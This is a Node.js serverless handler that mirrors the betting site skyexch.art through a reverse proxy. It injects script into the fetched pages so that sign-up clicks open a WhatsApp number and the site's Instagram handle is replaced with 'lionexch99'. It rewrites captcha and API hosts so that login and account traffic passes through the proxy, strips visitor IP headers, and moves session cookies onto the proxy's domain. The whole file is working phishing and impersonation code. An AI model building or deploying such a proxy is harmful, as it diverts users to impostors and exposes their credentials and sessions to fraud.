import https from 'node:https'

const WHATSAPP_URL =
  'https://api.whatsapp.com/send/?phone=123456789&text&type=phone_number&app_absent=0'
const INSTAGRAM_NAME = 'lionexch99'
const INSTAGRAM_URL = 'https://www.instagram.com/lionexch99'

const BROWSER_UA =
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'

export default async function handler(req, res) {
  try {
    const url = req.url || '/'

    // 1. Root and Portal HTML
    if (
      url === '/' ||
      url === '/index.html' ||
      url.startsWith('/?') ||
      url.startsWith('/#') ||
      url === '/portal' ||
      url.startsWith('/portal?') ||
      url.startsWith('/portal#')
    ) {
      try {
        const html = await new Promise((resolve, reject) => {
          const proxyReq = https.get(
            'https://www.skyexch.art/',
            {
              headers: {
                'User-Agent': BROWSER_UA,
                Accept:
                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
              },
            },
            (proxyRes) => {
              let data = ''
              proxyRes.on('data', (chunk) => (data += chunk))
              proxyRes.on('end', () => resolve(data))
            }
          )
          proxyReq.on('error', reject)
        })

        const injectedScript = `
          <!-- INJECTED OVERRIDES FOR WHATSAPP SIGN UP & INSTAGRAM LIONEXCH99 -->
          <style>
            .icon-support-instagram + span,
            .icon-support-instagram ~ span,
            [class*="icon-support-instagram"] + span,
            [class*="icon-support-instagram"] ~ span {
              font-size: 0 !important;
              display: inline-block !important;
            }
            .icon-support-instagram + span::after,
            .icon-support-instagram ~ span::after,
            [class*="icon-support-instagram"] + span::after,
            [class*="icon-support-instagram"] ~ span::after {
              content: "${INSTAGRAM_NAME}" !important;
              font-size: 13px !important;
              visibility: visible !important;
              display: inline-block !important;
            }
          </style>
          <script>
            (function() {
              const WA_LINK = ${JSON.stringify(WHATSAPP_URL)};
              const IG_LINK = ${JSON.stringify(INSTAGRAM_URL)};
              const IG_NAME = ${JSON.stringify(INSTAGRAM_NAME)};

              function fixCaptchaImages() {
                document.querySelectorAll('img').forEach(function(img) {
                  if (img.src && (img.src.includes('queryValidationCode') || img.alt === 'verify code')) {
                    if (img.src.includes('saapipl.')) {
                      img.src = img.src.replace(/https?:\\/\\/saapipl\\.[^\\/]+/, window.location.origin);
                    }
                  }
                });
              }

              document.addEventListener('click', function(e) {
                const el = e.target.closest('button, a, div, span, li, img');
                if (!el) return;

                if (el.tagName === 'IMG' && (el.src.includes('queryValidationCode') || el.alt === 'verify code')) {
                  setTimeout(fixCaptchaImages, 100);
                  setTimeout(fixCaptchaImages, 300);
                }

                const text = (el.innerText || el.textContent || '').trim().toLowerCase();

                if (text === 'sign up' || text === 'signup' || text === 'register' || text.includes('get online id')) {
                  e.preventDefault();
                  e.stopPropagation();
                  window.open(WA_LINK, '_blank', 'noopener,noreferrer');
                  return false;
                }

                if (text.includes('skyexchindia') || text.includes(IG_NAME) || el.classList.contains('icon-support-instagram') || el.querySelector('.icon-support-instagram')) {
                  e.preventDefault();
                  e.stopPropagation();
                  window.open(IG_LINK, '_blank', 'noopener,noreferrer');
                  return false;
                }
              }, true);

              setInterval(function() {
                fixCaptchaImages();
                document.querySelectorAll('span, div, p, a').forEach(function(node) {
                  if (node.children.length === 0 && node.textContent && node.textContent.includes('skyexchindia')) {
                    node.textContent = node.textContent.replace(/skyexchindia/g, IG_NAME);
                  }
                });
              }, 250);
            })();
          </script>
        `

        const modifiedHtml = html.replace('</head>', injectedScript + '</head>')
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' })
        res.end(modifiedHtml)
        return
      } catch (err) {
        console.error('HTML fetch error:', err)
        res.writeHead(500, { 'Content-Type': 'text/plain' })
        res.end('Error loading portal')
        return
      }
    }

    // 2. Patch JS Asset Files
    if (url.includes('/assets/') && url.endsWith('.js')) {
      try {
        const jsContent = await new Promise((resolve, reject) => {
          const proxyReq = https.get(
            `https://www.skyexch.art${url}`,
            {
              headers: {
                'User-Agent': BROWSER_UA,
                Accept: '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
              },
            },
            (proxyRes) => {
              let data = ''
              proxyRes.on('data', (chunk) => (data += chunk))
              proxyRes.on('end', () => resolve(data))
            }
          )
          proxyReq.on('error', reject)
        })

        const patchedJs = jsContent
          .replace(
            /window\.location\.host\.replace\(\/\^\[\^\.\]\*\/\s*,\s*["']saapipl["']\)/g,
            'window.location.host'
          )
          .replace(/\.replace\(\/\^\[\^\.\]\*\/\s*,\s*["']saapipl["']\)/g, '')

        res.writeHead(200, { 'Content-Type': 'application/javascript; charset=utf-8' })
        res.end(patchedJs)
        return
      } catch (err) {
        console.error('JS fetch error:', err)
        res.writeHead(500, { 'Content-Type': 'text/plain' })
        res.end('Error loading script')
        return
      }
    }

    // 3. Determine Proxy Target Host
    const isApi =
      url.startsWith('/verify') ||
      url.startsWith('/exchange') ||
      url.startsWith('/login') ||
      url.startsWith('/member') ||
      url.startsWith('/playerService')

    const targetHost = isApi ? 'saapipl.skyexch.art' : 'www.skyexch.art'

    // 4. Proxy request
    const forwardHeaders = { ...req.headers }
    delete forwardHeaders['host']
    delete forwardHeaders['x-forwarded-for']
    delete forwardHeaders['x-forwarded-proto']
    delete forwardHeaders['x-forwarded-host']
    delete forwardHeaders['x-real-ip']
    delete forwardHeaders['x-vercel-id']
    delete forwardHeaders['x-vercel-ip-timezone']
    delete forwardHeaders['x-vercel-ip-city']
    delete forwardHeaders['x-vercel-ip-country']
    delete forwardHeaders['x-vercel-ip-country-region']
    delete forwardHeaders['x-vercel-ip-latitude']
    delete forwardHeaders['x-vercel-ip-longitude']
    delete forwardHeaders['cf-connecting-ip']
    delete forwardHeaders['cf-ray']
    delete forwardHeaders['cf-visitor']

    forwardHeaders['host'] = targetHost
    forwardHeaders['user-agent'] = BROWSER_UA

    if (isApi) {
      forwardHeaders['origin'] = 'https://www.skyexch.art'
      forwardHeaders['referer'] = 'https://www.skyexch.art/'
    } else {
      delete forwardHeaders['origin']
      delete forwardHeaders['referer']
    }

    const proxyReq = https.request(
      {
        hostname: targetHost,
        port: 443,
        path: url,
        method: req.method,
        headers: forwardHeaders,
      },
      (proxyRes) => {
        const respHeaders = { ...proxyRes.headers }
        const reqOrigin = req.headers['origin'] || '*'
        respHeaders['access-control-allow-origin'] = reqOrigin
        respHeaders['access-control-allow-credentials'] = 'true'

        const cookies = proxyRes.headers['set-cookie']
        if (cookies) {
          respHeaders['set-cookie'] = cookies.map((cookie) =>
            cookie
              .replace(/Domain=[^;]+;?\s*/gi, '')
              .replace(/SameSite=[^;]+;?\s*/gi, 'SameSite=Lax; ')
          )
        }

        res.writeHead(proxyRes.statusCode || 200, respHeaders)
        proxyRes.pipe(res)
      }
    )

    proxyReq.on('error', (err) => {
      console.error('Proxy request error:', err)
      if (!res.headersSent) {
        res.writeHead(502, { 'Content-Type': 'text/plain' })
        res.end('Bad Gateway')
      }
    })

    req.pipe(proxyReq)
  } catch (globalErr) {
    console.error('Global serverless error:', globalErr)
    if (!res.headersSent) {
      res.writeHead(500, { 'Content-Type': 'text/plain' })
      res.end('Internal Server Error')
    }
  }
}
